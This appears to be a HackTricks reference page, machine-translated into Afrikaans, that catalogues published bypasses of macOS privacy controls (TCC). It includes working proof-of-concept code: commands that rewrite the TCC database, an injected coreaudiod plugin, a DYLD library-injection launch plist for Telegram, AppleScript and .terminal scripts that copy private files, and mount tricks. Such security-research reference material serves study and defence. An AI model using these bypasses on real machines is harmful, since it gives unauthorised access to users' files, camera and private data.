# macOS TCC Bypasses

{{#include ../../../../../banners/hacktricks-training.md}}

## Volgens funksionaliteit

### Skryf Bypass

Dit is nie 'n bypass nie, dit is net hoe TCC werk: **Dit beskerm nie teen skryf nie**. As Terminal **nie toegang het om die Desktop van 'n gebruiker te lees nie, kan dit steeds daarin skryf**:
```shell-session
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % echo asd > Desktop/lalala
username@hostname ~ % ls Desktop
ls: Desktop: Operation not permitted
username@hostname ~ % cat Desktop/lalala
asd
```
Die **verlengde attribuut `com.apple.macl`** word by die nuwe **lêer** gevoeg om die **skeppers app** toegang te gee om dit te lees.

### TCC ClickJacking

Dit is moontlik om **'n venster oor die TCC-prompt te plaas** sodat die gebruiker dit kan **aanvaar** sonder om dit te besef. Jy kan 'n PoC vind in [**TCC-ClickJacking**](https://github.com/breakpointHQ/TCC-ClickJacking)**.**

<figure><img src="broken-reference" alt=""><figcaption><p><a href="https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg">https://github.com/breakpointHQ/TCC-ClickJacking/raw/main/resources/clickjacking.jpg</a></p></figcaption></figure>

### TCC Versoek deur arbitrêre naam

Die aanvaller kan **apps met enige naam** (bv. Finder, Google Chrome...) in die **`Info.plist`** skep en dit laat aansoek doen om toegang tot 'n TCC-beskermde ligging. Die gebruiker sal dink dat die wettige toepassing die een is wat hierdie toegang aanvra.\
Boonop is dit moontlik om die wettige app van die Dock te verwyder en die vals een daarop te plaas, sodat wanneer die gebruiker op die vals een klik (wat dieselfde ikoon kan gebruik), dit die wettige een kan bel, TCC-toestemmings kan vra en 'n malware kan uitvoer, wat die gebruiker laat glo dat die wettige app die toegang aangevra het.

<figure><img src="https://lh7-us.googleusercontent.com/Sh-Z9qekS_fgIqnhPVSvBRmGpCXCpyuVuTw0x5DLAIxc2MZsSlzBOP7QFeGo_fjMeCJJBNh82f7RnewW1aWo8r--JEx9Pp29S17zdDmiyGgps1hH9AGR8v240m5jJM8k0hovp7lm8ZOrbzv-RC8NwzbB8w=s2048" alt="" width="375"><figcaption></figcaption></figure>

Meer inligting en PoC in:

{{#ref}}
../../../macos-privilege-escalation.md
{{#endref}}

### SSH Bypass

Standaard het toegang via **SSH "Volledige Skyf Toegang"** gehad. Om dit te deaktiveer, moet jy dit gelys maar gedeaktiveer hê (om dit uit die lys te verwyder, sal nie daardie voorregte verwyder nie):

![](<../../../../../images/image (1077).png>)

Hier kan jy voorbeelde vind van hoe sommige **malware in staat was om hierdie beskerming te omseil**:

- [https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/](https://www.jamf.com/blog/zero-day-tcc-bypass-discovered-in-xcsset-malware/)

> [!CAUTION]
> Let daarop dat jy nou **Volledige Skyf Toegang** nodig het om SSH te kan aktiveer.

### Handle extensies - CVE-2022-26767

Die attribuut **`com.apple.macl`** word aan lêers gegee om 'n **sekere toepassing toestemming te gee om dit te lees.** Hierdie attribuut word gestel wanneer **sleep\&laat** 'n lêer oor 'n app, of wanneer 'n gebruiker **dubbelklik** op 'n lêer om dit met die **standaard toepassing** te open.

Daarom kan 'n gebruiker **'n kwaadwillige app registreer** om al die extensies te hanteer en Launch Services aanroep om **enige lêer te open** (sodat die kwaadwillige lêer toegang gegee sal word om dit te lees).

### iCloud

Die regte **`com.apple.private.icloud-account-access`** maak dit moontlik om met die **`com.apple.iCloudHelper`** XPC-diens te kommunikeer wat **iCloud tokens** sal verskaf.

**iMovie** en **Garageband** het hierdie regte gehad en ander wat dit toegelaat het.

Vir meer **inligting** oor die ontploffing om **iCloud tokens** van daardie regte te verkry, kyk na die praatjie: [**#OBTS v5.0: "Wat gebeur op jou Mac, bly op Apple se iCloud?!" - Wojciech Regula**](https://www.youtube.com/watch?v=_6e2LhmxVc0)

### kTCCServiceAppleEvents / Automatisering

'n App met die **`kTCCServiceAppleEvents`** toestemming sal in staat wees om **ander Apps te beheer**. Dit beteken dat dit in staat kan wees om **die toestemming wat aan die ander Apps gegee is, te misbruik**.

Vir meer inligting oor Apple Skripte, kyk:

{{#ref}}
macos-apple-scripts.md
{{#endref}}

Byvoorbeeld, as 'n App **Automatisering toestemming oor `iTerm`** het, het **`Terminal`** toegang oor iTerm:

<figure><img src="../../../../../images/image (981).png" alt=""><figcaption></figcaption></figure>

#### Oor iTerm

Terminal, wat nie FDA het nie, kan iTerm aanroep, wat dit het, en dit gebruik om aksies uit te voer:
```applescript:iterm.script
tell application "iTerm"
activate
tell current window
create tab with default profile
end tell
tell current session of current window
write text "cp ~/Desktop/private.txt /tmp"
end tell
end tell
```

```bash
osascript iterm.script
```
#### Oor Finder

Of as 'n App toegang oor Finder het, kan dit 'n skrif soos hierdie wees:
```applescript
set a_user to do shell script "logname"
tell application "Finder"
set desc to path to home folder
set copyFile to duplicate (item "private.txt" of folder "Desktop" of folder a_user of item "Users" of disk of home) to folder desc with replacing
set t to paragraphs of (do shell script "cat " & POSIX path of (copyFile as alias)) as text
end tell
do shell script "rm " & POSIX path of (copyFile as alias)
```
## Deur App gedrag

### CVE-2020–9934 - TCC <a href="#c19b" id="c19b"></a>

Die gebruikerland **tccd daemon** wat die **`HOME`** **env** veranderlike gebruik om toegang te verkry tot die TCC gebruikersdatabasis vanaf: **`$HOME/Library/Application Support/com.apple.TCC/TCC.db`**

Volgens [hierdie Stack Exchange pos](https://stackoverflow.com/questions/135688/setting-environment-variables-on-os-x/3756686#3756686) en omdat die TCC daemon via `launchd` binne die huidige gebruiker se domein loop, is dit moontlik om **alle omgewing veranderlikes** wat aan dit deurgegee word te **beheer**.\
Dus, 'n **aanvaller kan die `$HOME` omgewing** veranderlike in **`launchctl`** stel om na 'n **gecontroleerde** **gids** te verwys, **herbegin** die **TCC** daemon, en dan die **TCC databasis direk** te **wysig** om vir homself **elke TCC regte beskikbaar** te gee sonder om ooit die eindgebruiker te vra.\
PoC:
```bash
# reset database just in case (no cheating!)
$> tccutil reset All
# mimic TCC's directory structure from ~/Library
$> mkdir -p "/tmp/tccbypass/Library/Application Support/com.apple.TCC"
# cd into the new directory
$> cd "/tmp/tccbypass/Library/Application Support/com.apple.TCC/"
# set launchd $HOME to this temporary directory
$> launchctl setenv HOME /tmp/tccbypass
# restart the TCC daemon
$> launchctl stop com.apple.tccd && launchctl start com.apple.tccd
# print out contents of TCC database and then give Terminal access to Documents
$> sqlite3 TCC.db .dump
$> sqlite3 TCC.db "INSERT INTO access
VALUES('kTCCServiceSystemPolicyDocumentsFolder',
'com.apple.Terminal', 0, 1, 1,
X'fade0c000000003000000001000000060000000200000012636f6d2e6170706c652e5465726d696e616c000000000003',
NULL,
NULL,
'UNUSED',
NULL,
NULL,
1333333333333337);"
# list Documents directory without prompting the end user
$> ls ~/Documents
```
### CVE-2021-30761 - Aantekeninge

Aantekeninge het toegang tot TCC beskermde plekke, maar wanneer 'n aantekening geskep word, word dit **in 'n nie-beskermde plek** geskep. So, jy kan aantekeninge vra om 'n beskermde lêer in 'n aantekening (so in 'n nie-beskermde plek) te kopieer en dan toegang tot die lêer te verkry:

<figure><img src="../../../../../images/image (476).png" alt=""><figcaption></figcaption></figure>

### CVE-2021-30782 - Translokasie

Die binêre `/usr/libexec/lsd` met die biblioteek `libsecurity_translocate` het die regte `com.apple.private.nullfs_allow` gehad wat dit toegelaat het om **nullfs** montages te skep en het die regte `com.apple.private.tcc.allow` gehad met **`kTCCServiceSystemPolicyAllFiles`** om toegang tot elke lêer te verkry.

Dit was moontlik om die kwarantyn-attribuut aan "Biblioteek" toe te voeg, die **`com.apple.security.translocation`** XPC diens aan te roep en dan sou dit Biblioteek na **`$TMPDIR/AppTranslocation/d/d/Library`** kaart waar al die dokumente binne Biblioteek **toeganklik** kon wees.

### CVE-2023-38571 - Musiek & TV <a href="#cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv" id="cve-2023-38571-a-macos-tcc-bypass-in-music-and-tv"></a>

**`Musiek`** het 'n interessante kenmerk: Wanneer dit loop, sal dit die lêers wat na **`~/Music/Music/Media.localized/Automatically Add to Music.localized`** gegooi word, in die gebruiker se "media biblioteek" **invoer**. Boonop roep dit iets soos: **`rename(a, b);`** waar `a` en `b` is:

- `a = "~/Music/Music/Media.localized/Automatically Add to Music.localized/myfile.mp3"`
- `b = "~/Music/Music/Media.localized/Automatically Add to Music.localized/Not Added.localized/2023-09-25 11.06.28/myfile.mp3"`

Hierdie **`rename(a, b);`** gedrag is kwesbaar vir 'n **Race Condition**, aangesien dit moontlik is om 'n vals **TCC.db** lêer binne die `Automatically Add to Music.localized` gids te plaas en dan wanneer die nuwe gids (b) geskep word, die lêer te kopieer, dit te verwyder, en dit na **`~/Library/Application Support/com.apple.TCC`** te wys.

### SQLITE_SQLLOG_DIR - CVE-2023-32422

As **`SQLITE_SQLLOG_DIR="path/folder"`** basies beteken dit dat **enige oop db na daardie pad gekopieer word**. In hierdie CVE is hierdie beheer misbruik om **te skryf** binne 'n **SQLite databasis** wat gaan **oop wees deur 'n proses met FDA die TCC databasis**, en dan **`SQLITE_SQLLOG_DIR`** te misbruik met 'n **symlink in die lêernaam** sodat wanneer daardie databasis **oop** is, die gebruiker **TCC.db word oorgeskryf** met die oop een.\
**Meer inligting** [**in die skrywe**](https://gergelykalman.com/sqlol-CVE-2023-32422-a-macos-tcc-bypass.html) **en**[ **in die praatjie**](https://www.youtube.com/watch?v=f1HA5QhLQ7Y&t=20548s).

### **SQLITE_AUTO_TRACE**

As die omgewing veranderlike **`SQLITE_AUTO_TRACE`** gestel is, sal die biblioteek **`libsqlite3.dylib`** begin **log** al die SQL vrae. Baie toepassings het hierdie biblioteek gebruik, so dit was moontlik om al hul SQLite vrae te log. 

Verskeie Apple toepassings het hierdie biblioteek gebruik om toegang tot TCC beskermde inligting te verkry.
```bash
# Set this env variable everywhere
launchctl setenv SQLITE_AUTO_TRACE 1
```
### MTL_DUMP_PIPELINES_TO_JSON_FILE - CVE-2023-32407

Hierdie **omgewing veranderlike word deur die `Metal` raamwerk gebruik** wat 'n afhanklikheid is van verskeie programme, veral `Music`, wat FDA het.

Stel die volgende in: `MTL_DUMP_PIPELINES_TO_JSON_FILE="pad/naam"`. As `pad` 'n geldige gids is, sal die fout geaktiveer word en kan ons `fs_usage` gebruik om te sien wat in die program gebeur:

- 'n lêer sal `open()` word, genoem `pad/.dat.nosyncXXXX.XXXXXX` (X is ewekansig)
- een of meer `write()`s sal die inhoud na die lêer skryf (ons beheer dit nie)
- `pad/.dat.nosyncXXXX.XXXXXX` sal `renamed()` word na `pad/naam`

Dit is 'n tydelike lêer skrywe, gevolg deur 'n **`rename(old, new)`** **wat nie veilig is nie.**

Dit is nie veilig nie omdat dit moet **die ou en nuwe paaie apart oplos**, wat 'n bietjie tyd kan neem en kwesbaar kan wees vir 'n Race Condition. Vir meer inligting kan jy die `xnu` funksie `renameat_internal()` nagaan.

> [!CAUTION]
> So, basies, as 'n bevoorregte proses hernoem vanaf 'n gids wat jy beheer, kan jy 'n RCE wen en dit laat toegang tot 'n ander lêer of, soos in hierdie CVE, die lêer wat die bevoorregte toepassing geskep het oopmaak en 'n FD stoor.
>
> As die hernoem toegang tot 'n gids wat jy beheer, terwyl jy die bronlêer gewysig het of 'n FD daarvoor het, verander jy die bestemmingslêer (of gids) om na 'n sylynk te wys, sodat jy kan skryf wanneer jy wil.

Dit was die aanval in die CVE: Byvoorbeeld, om die gebruiker se `TCC.db` te oorskryf, kan ons:

- skep `/Users/hacker/ourlink` om na `/Users/hacker/Library/Application Support/com.apple.TCC/` te wys
- skep die gids `/Users/hacker/tmp/`
- stel `MTL_DUMP_PIPELINES_TO_JSON_FILE=/Users/hacker/tmp/TCC.db`
- aktiveer die fout deur `Music` met hierdie omgewing veranderlike te loop
- vang die `open()` van `/Users/hacker/tmp/.dat.nosyncXXXX.XXXXXX` (X is ewekansig)
- hier open ons ook hierdie lêer vir skryf, en hou aan by die lêer beskrywer
- atomies ruil `/Users/hacker/tmp` met `/Users/hacker/ourlink` **in 'n lus**
- ons doen dit om ons kanse om te slaag te maksimeer aangesien die wedloopvenster redelik dun is, maar om die wedloop te verloor het 'n verwaarloosbare nadeel
- wag 'n bietjie
- toets of ons gelukkig was
- as nie, loop weer van bo af

Meer inligting in [https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html](https://gergelykalman.com/lateralus-CVE-2023-32407-a-macos-tcc-bypass.html)

> [!CAUTION]
> Nou, as jy probeer om die omgewing veranderlike `MTL_DUMP_PIPELINES_TO_JSON_FILE` te gebruik, sal programme nie begin nie

### Apple Remote Desktop

As root kan jy hierdie diens aktiveer en die **ARD agent sal volle skyf toegang hê** wat dan deur 'n gebruiker misbruik kan word om dit te laat kopieer 'n nuwe **TCC gebruiker databasis**.

## Deur **NFSHomeDirectory**

TCC gebruik 'n databasis in die gebruiker se HOME gids om toegang tot hulpbronne spesifiek vir die gebruiker te beheer by **$HOME/Library/Application Support/com.apple.TCC/TCC.db**.\
Daarom, as die gebruiker daarin slaag om TCC te herlaai met 'n $HOME omgewing veranderlike wat na 'n **ander gids** wys, kan die gebruiker 'n nuwe TCC databasis in **/Library/Application Support/com.apple.TCC/TCC.db** skep en TCC mislei om enige TCC toestemming aan enige toepassing toe te ken.

> [!TIP]
> Let daarop dat Apple die instelling wat binne die gebruiker se profiel in die **`NFSHomeDirectory`** attribuut gestoor is, gebruik vir die **waarde van `$HOME`**, so as jy 'n toepassing met toestemming om hierdie waarde te wysig (**`kTCCServiceSystemPolicySysAdminFiles`**) kompromitteer, kan jy **wapen** hierdie opsie met 'n TCC omseiling.

### [CVE-2020–9934 - TCC](./#c19b) <a href="#c19b" id="c19b"></a>

### [CVE-2020-27937 - Directory Utility](./#cve-2020-27937-directory-utility-1)

### CVE-2021-30970 - Powerdir

Die **eerste POC** gebruik [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/) en [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/) om die **HOME** gids van die gebruiker te wysig.

1. Kry 'n _csreq_ blob vir die teiken toepassing.
2. Plant 'n vals _TCC.db_ lêer met vereiste toegang en die _csreq_ blob.
3. Eksporteer die gebruiker se Directory Services inskrywing met [**dsexport**](https://www.unix.com/man-page/osx/1/dsexport/).
4. Wysig die Directory Services inskrywing om die gebruiker se tuisgids te verander.
5. Importeer die gewysig Directory Services inskrywing met [**dsimport**](https://www.unix.com/man-page/osx/1/dsimport/).
6. Stop die gebruiker se _tccd_ en herlaai die proses.

Die tweede POC het **`/usr/libexec/configd`** gebruik wat `com.apple.private.tcc.allow` met die waarde `kTCCServiceSystemPolicySysAdminFiles` gehad het.\
Dit was moontlik om **`configd`** met die **`-t`** opsie te loop, 'n aanvaller kon 'n **aangepaste Bundel om te laai** spesifiseer. Daarom, die uitbuiting **vervang** die **`dsexport`** en **`dsimport`** metode van die verandering van die gebruiker se tuisgids met 'n **`configd` kode-inspuiting**.

Vir meer inligting, kyk na die [**oorspronklike verslag**](https://www.microsoft.com/en-us/security/blog/2022/01/10/new-macos-vulnerability-powerdir-could-lead-to-unauthorized-user-data-access/).

## Deur proses inspuiting

Daar is verskillende tegnieke om kode binne 'n proses in te spuit en sy TCC voorregte te misbruik:

{{#ref}}
../../../macos-proces-abuse/
{{#endref}}

Boonop is die mees algemene proses inspuiting om TCC te omseil wat gevind is via **plugins (laai biblioteek)**.\
Plugins is ekstra kode gewoonlik in die vorm van biblioteke of plist, wat deur die **hoofd toepassing** gelaai sal word en onder sy konteks sal uitvoer. Daarom, as die hoofd toepassing toegang tot TCC beperkte lêers gehad het (via toegekende toestemming of regte), sal die **aangepaste kode dit ook hê**.

### CVE-2020-27937 - Directory Utility

Die toepassing `/System/Library/CoreServices/Applications/Directory Utility.app` het die regte **`kTCCServiceSystemPolicySysAdminFiles`**, het plugins met **`.daplug`** uitbreiding gelaai en **het nie die geharde** runtime gehad nie.

Om hierdie CVE te wapen, word die **`NFSHomeDirectory`** **gewysig** (misbruik van die vorige regte) om in staat te wees om die gebruiker se TCC databasis oor te neem om TCC te omseil.

Vir meer inligting, kyk na die [**oorspronklike verslag**](https://wojciechregula.blog/post/change-home-directory-and-bypass-tcc-aka-cve-2020-27937/).

### CVE-2020-29621 - Coreaudiod

Die binêre **`/usr/sbin/coreaudiod`** het die regte `com.apple.security.cs.disable-library-validation` en `com.apple.private.tcc.manager`. Die eerste **toelaat kode inspuiting** en die tweede een gee dit toegang om **TCC te bestuur**.

Hierdie binêre het toegelaat om **derdeparty plugins** van die gids `/Library/Audio/Plug-Ins/HAL` te laai. Daarom was dit moontlik om **'n plugin te laai en die TCC toestemming te misbruik** met hierdie PoC:
```objectivec
#import <Foundation/Foundation.h>
#import <Security/Security.h>

extern void TCCAccessSetForBundleIdAndCodeRequirement(CFStringRef TCCAccessCheckType, CFStringRef bundleID, CFDataRef requirement, CFBooleanRef giveAccess);

void add_tcc_entry() {
CFStringRef TCCAccessCheckType = CFSTR("kTCCServiceSystemPolicyAllFiles");

CFStringRef bundleID = CFSTR("com.apple.Terminal");
CFStringRef pureReq = CFSTR("identifier \"com.apple.Terminal\" and anchor apple");
SecRequirementRef requirement = NULL;
SecRequirementCreateWithString(pureReq, kSecCSDefaultFlags, &requirement);
CFDataRef requirementData = NULL;
SecRequirementCopyData(requirement, kSecCSDefaultFlags, &requirementData);

TCCAccessSetForBundleIdAndCodeRequirement(TCCAccessCheckType, bundleID, requirementData, kCFBooleanTrue);
}

__attribute__((constructor)) static void constructor(int argc, const char **argv) {

add_tcc_entry();

NSLog(@"[+] Exploitation finished...");
exit(0);
```
Vir meer inligting, kyk na die [**oorspronklike verslag**](https://wojciechregula.blog/post/play-the-music-and-bypass-tcc-aka-cve-2020-29621/).

### Toestel Abstraksielaag (DAL) Plug-Ins

Stelsels toepassings wat kamera stroom via Core Media I/O (toepassings met **`kTCCServiceCamera`**) laai **in die proses hierdie plugins** geleë in `/Library/CoreMediaIO/Plug-Ins/DAL` (nie SIP beperk nie).

Net om 'n biblioteek met die algemene **konstruktors** daar te stoor, sal werk om **kode in te spuit**.

Verskeie Apple toepassings was kwesbaar hiervoor.

### Firefox

Die Firefox toepassing het die `com.apple.security.cs.disable-library-validation` en `com.apple.security.cs.allow-dyld-environment-variables` regte gehad:
```xml
codesign -d --entitlements :- /Applications/Firefox.app
Executable=/Applications/Firefox.app/Contents/MacOS/firefox

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "https://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>com.apple.security.cs.allow-unsigned-executable-memory</key>
<true/>
<key>com.apple.security.cs.disable-library-validation</key>
<true/>
<key>com.apple.security.cs.allow-dyld-environment-variables</key><true/>
<true/>
<key>com.apple.security.device.audio-input</key>
<true/>
<key>com.apple.security.device.camera</key>
<true/>
<key>com.apple.security.personal-information.location</key>
<true/>
<key>com.apple.security.smartcard</key>
<true/>
</dict>
</plist>
```
Vir meer inligting oor hoe om dit maklik te benut [**kyk die oorspronklike verslag**](https://wojciechregula.blog/post/how-to-rob-a-firefox/).

### CVE-2020-10006

Die binêre `/system/Library/Filesystems/acfs.fs/Contents/bin/xsanctl` het die regte **`com.apple.private.tcc.allow`** en **`com.apple.security.get-task-allow`** gehad, wat dit moontlik gemaak het om kode binne die proses in te spuit en die TCC-privileges te gebruik.

### CVE-2023-26818 - Telegram

Telegram het die regte **`com.apple.security.cs.allow-dyld-environment-variables`** en **`com.apple.security.cs.disable-library-validation`** gehad, so dit was moontlik om dit te misbruik om **toegang tot sy toestemmings te verkry** soos om met die kamera op te neem. Jy kan [**die payload in die skrywe vind**](https://danrevah.github.io/2023/05/15/CVE-2023-26818-Bypass-TCC-with-Telegram/).

Let op hoe om die env-variabele te gebruik om 'n biblioteek te laai, 'n **aangepaste plist** is geskep om hierdie biblioteek in te spuit en **`launchctl`** is gebruik om dit te begin:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.telegram.launcher</string>
<key>RunAtLoad</key>
<true/>
<key>EnvironmentVariables</key>
<dict>
<key>DYLD_INSERT_LIBRARIES</key>
<string>/tmp/telegram.dylib</string>
</dict>
<key>ProgramArguments</key>
<array>
<string>/Applications/Telegram.app/Contents/MacOS/Telegram</string>
</array>
<key>StandardOutPath</key>
<string>/tmp/telegram.log</string>
<key>StandardErrorPath</key>
<string>/tmp/telegram.log</string>
</dict>
</plist>
```

```bash
launchctl load com.telegram.launcher.plist
```
## Deur oop aanroepe

Dit is moontlik om **`open`** aan te roep selfs terwyl dit in 'n sandbox is.

### Terminal Skripte

Dit is redelik algemeen om terminal **Volledige Skyf Toegang (FDA)** te gee, ten minste op rekenaars wat deur tegnologie mense gebruik word. En dit is moontlik om **`.terminal`** skripte hiermee aan te roep.

**`.terminal`** skripte is plist-lêers soos hierdie een met die opdrag om uit te voer in die **`CommandString`** sleutel:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
<dict>
<key>CommandString</key>
<string>cp ~/Desktop/private.txt /tmp/;</string>
<key>ProfileCurrentVersion</key>
<real>2.0600000000000001</real>
<key>RunCommandAsShell</key>
<false/>
<key>name</key>
<string>exploit</string>
<key>type</key>
<string>Window Settings</string>
</dict>
</plist>
```
'n Aansoek kan 'n terminalskrip in 'n ligging soos /tmp skryf en dit met 'n opdrag soos:
```objectivec
// Write plist in /tmp/tcc.terminal
[...]
NSTask *task = [[NSTask alloc] init];
NSString * exploit_location = @"/tmp/tcc.terminal";
task.launchPath = @"/usr/bin/open";
task.arguments = @[@"-a", @"/System/Applications/Utilities/Terminal.app",
exploit_location]; task.standardOutput = pipe;
[task launch];
```
## Deur te monteer

### CVE-2020-9771 - mount_apfs TCC omseiling en privilige-eskalasie

**Enige gebruiker** (selfs onprivilegieerde) kan 'n tydmasjien-snapshot skep en monteer en **toegang hê tot AL die lêers** van daardie snapshot.\
Die **enige privilige** wat benodig word, is dat die toepassing wat gebruik word (soos `Terminal`) **Volledige Skyftoegang** (FDA) toegang moet hê (`kTCCServiceSystemPolicyAllfiles`) wat deur 'n admin toegestaan moet word.
```bash
# Create snapshot
tmutil localsnapshot

# List snapshots
tmutil listlocalsnapshots /
Snapshots for disk /:
com.apple.TimeMachine.2023-05-29-001751.local

# Generate folder to mount it
cd /tmp # I didn it from this folder
mkdir /tmp/snap

# Mount it, "noowners" will mount the folder so the current user can access everything
/sbin/mount_apfs -o noowners -s com.apple.TimeMachine.2023-05-29-001751.local /System/Volumes/Data /tmp/snap

# Access it
ls /tmp/snap/Users/admin_user # This will work
```
'n Meer gedetailleerde verduideliking kan [**gevind word in die oorspronklike verslag**](https://theevilbit.github.io/posts/cve_2020_9771/)**.**

### CVE-2021-1784 & CVE-2021-30808 - Monteer oor TCC-lêer

Selfs al is die TCC DB-lêer beskerm, was dit moontlik om **oor die gids** 'n nuwe TCC.db-lêer te **monteer**:
```bash
# CVE-2021-1784
## Mount over Library/Application\ Support/com.apple.TCC
hdiutil attach -owners off -mountpoint Library/Application\ Support/com.apple.TCC test.dmg

# CVE-2021-1784
## Mount over ~/Library
hdiutil attach -readonly -owners off -mountpoint ~/Library /tmp/tmp.dmg
```

```python
# This was the python function to create the dmg
def create_dmg():
os.system("hdiutil create /tmp/tmp.dmg -size 2m -ov -volname \"tccbypass\" -fs APFS 1>/dev/null")
os.system("mkdir /tmp/mnt")
os.system("hdiutil attach -owners off -mountpoint /tmp/mnt /tmp/tmp.dmg 1>/dev/null")
os.system("mkdir -p /tmp/mnt/Application\ Support/com.apple.TCC/")
os.system("cp /tmp/TCC.db /tmp/mnt/Application\ Support/com.apple.TCC/TCC.db")
os.system("hdiutil detach /tmp/mnt 1>/dev/null")
```
Kontroleer die **volledige uitbuiting** in die [**oorspronklike skrywe**](https://theevilbit.github.io/posts/cve-2021-30808/).

### CVE-2024-40855

Soos verduidelik in die [oorspronklike skrywe](https://www.kandji.io/blog/macos-audit-story-part2), het hierdie CVE `diskarbitrationd` misbruik.

Die funksie `DADiskMountWithArgumentsCommon` van die openbare `DiskArbitration` raamwerk het die sekuriteitskontroles uitgevoer. Dit is egter moontlik om dit te omseil deur `diskarbitrationd` direk aan te roep en dus `../` elemente in die pad en symlinks te gebruik.

Dit het 'n aanvaller toegelaat om arbitrêre monte in enige plek te doen, insluitend oor die TCC-databasis as gevolg van die regte `com.apple.private.security.storage-exempt.heritable` van `diskarbitrationd`.

### asr

Die hulpmiddel **`/usr/sbin/asr`** het toegelaat om die hele skyf te kopieer en dit op 'n ander plek te monteer terwyl TCC-beskerming omseil word.

### Ligging Dienste

Daar is 'n derde TCC-databasis in **`/var/db/locationd/clients.plist`** om kliënte aan te dui wat toegelaat word om **toegang tot ligging dienste** te hê.\
Die gids **`/var/db/locationd/` was nie beskerm teen DMG-montage** nie, so dit was moontlik om ons eie plist te monteer.

## Deur opstartprogramme

{{#ref}}
../../../../macos-auto-start-locations.md
{{#endref}}

## Deur grep

In verskeie gevalle sal lêers sensitiewe inligting soos e-posse, telefoonnommers, boodskappe... in nie-beskermde plekke stoor (wat as 'n kwesbaarheid in Apple tel).

<figure><img src="../../../../../images/image (474).png" alt=""><figcaption></figcaption></figure>

## Sintetiese Kliks

Dit werk nie meer nie, maar dit [**het in die verlede gewerk**](https://twitter.com/noarfromspace/status/639125916233416704/photo/1)**:**

<figure><img src="../../../../../images/image (29).png" alt=""><figcaption></figcaption></figure>

Nog 'n manier om [**CoreGraphics gebeurtenisse**](https://objectivebythesea.org/v2/talks/OBTS_v2_Wardle.pdf) te gebruik:

<figure><img src="../../../../../images/image (30).png" alt="" width="563"><figcaption></figcaption></figure>

## Verwysing

- [**https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8**](https://medium.com/@mattshockl/cve-2020-9934-bypassing-the-os-x-transparency-consent-and-control-tcc-framework-for-4e14806f1de8)
- [**https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/**](https://www.sentinelone.com/labs/bypassing-macos-tcc-user-privacy-protections-by-accident-and-design/)
- [**20+ Manier om jou macOS Privaatheid Meganismes te Omseil**](https://www.youtube.com/watch?v=W9GxnP8c8FU)
- [**Knockout Win Teen TCC - 20+ NUWE Manier om jou MacOS Privaatheid Meganismes te Omseil**](https://www.youtube.com/watch?v=a9hsxPdRxsY)

{{#include ../../../../../banners/hacktricks-training.md}}
